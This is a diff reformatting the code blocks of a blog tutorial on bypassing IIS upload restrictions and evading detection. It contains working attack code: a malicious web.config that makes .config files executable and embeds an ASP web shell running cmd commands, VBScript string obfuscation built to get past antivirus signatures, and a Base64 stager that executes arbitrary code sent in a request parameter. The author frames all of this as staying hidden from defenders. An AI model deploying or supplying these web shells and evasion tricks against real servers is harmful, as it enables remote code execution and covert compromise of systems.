@@ -1,6 +1,6 @@
 ---
-layout: post
-Title: "Bypass Upload Restrictions and Evade Detection"
+title: "Bypass Upload Restrictions and Evade Detection"
+author: Felipe Gaspar
 ---
 Let's be honest, bypassing upload restrictions is not something new and usually involves different methods to achieve the same goal: execute your 1337 code on your victim; But you can't always do this without getting caught by the Blue Team.
 
@@ -69,7 +69,7 @@ Searching on the interwebs (AKA google) we find the simplest and yet functional 
 
 Adding our XML (from web.config) and removing some HTML lines resulted in the code below:
 
-{% highlight vb %}
+```vb
 <?xml version="1.0" encoding="UTF-8"?><configuration><system.webServer><handlers accessPolicy="Read, Script, Write"><add name="new_policy" path="*.config" verb="GET" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /></handlers><security><requestFiltering><fileExtensions><remove fileExtension=".config" /></fileExtensions><hiddenSegments><remove segment="web.config" /></hiddenSegments></requestFiltering></security></system.webServer><appSettings></appSettings></configuration>
 <!–-
 <% 
@@ -88,7 +88,7 @@ thisDir = getCommandOutput("cmd /c" & szCMD)
 Response.Write(thisDir)
 
 %>
-{% endhighlight %}
+```
 
 And voila.. we have a simple web shell:
 
@@ -147,11 +147,11 @@ What can we do about it?
 
 We can transform our string into something that will only make sense when executed. There's a couple of ways to achieve this and I'll be showing you the easiest way:
 
-{% highlight vb %}
+```vb
 Dim x
 x = Split("a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s",",")
 Execute("Set oScript = "+x(2)+"reate"+x(14)+"bject(""WSCRIPT.SHELL"")")
-{% endhighlight %}
+```
 
 With "Split()" we created a simple dictionary that can then be used to create the strings that are getting blocked. The "Execute()" acts in the same way as an "Eval()", but in this context the code will be treated as a simple assignment statement whereas with eval it would result in a comparison ([you can read more here](https://docs.microsoft.com/en-us/previous-versions//0z5x4094(v=vs.85)?redirectedfrom=MSDN)). 
 
@@ -231,7 +231,7 @@ Since we are going with the default script engine, VBScript, we are passing `--l
 
 And that's it, just copy and past to our "web.config" and execute it:
 
-{% highlight vb %}
+```vb
 <?xml version="1.0" encoding="UTF-8"?><configuration><system.webServer><handlers accessPolicy="Read, Script, Write"><add name="new_policy" path="*.config" verb="GET" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /></handlers><security><requestFiltering><fileExtensions><remove fileExtension=".config" /></fileExtensions><hiddenSegments><remove segment="web.config" /></hiddenSegments></requestFiltering></security></system.webServer><appSettings></appSettings></configuration>
 <!–-
 <% 
@@ -379,7 +379,7 @@ If Err.Number <> 0 Then
 End If
 %>
 -–>
-{% endhighlight %}
+```
 
 As expected, after execution the file is created:
 
@@ -405,7 +405,7 @@ So let's create something that will serve as a stager for our payload, the easie
 
 Since we are using classic ASP, we can receive our payload using the "Request()" function, decode it's Base64 content and execute with a combination of "Execute()" and "Eval()".
 
-{% highlight vb %}
+```vb
 <?xml version="1.0" encoding="UTF-8"?><configuration><system.webServer><handlers accessPolicy="Read, Script, Write"><add name="new_policy" path="*.config" verb="GET,POST" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /></handlers><security><requestFiltering><fileExtensions><remove fileExtension=".config" /></fileExtensions><hiddenSegments><remove segment="web.config" /></hiddenSegments></requestFiltering></security></system.webServer><appSettings></appSettings></configuration>
 <!–-
 <% 
@@ -442,7 +442,7 @@ dim fg : fg = "Ex"+mom(4)+"cute(bd6(Request(""file"")))"
 eval fg
 %>
 -–>
-{% endhighlight %}
+```
 
 And now.. **0** detections.
 
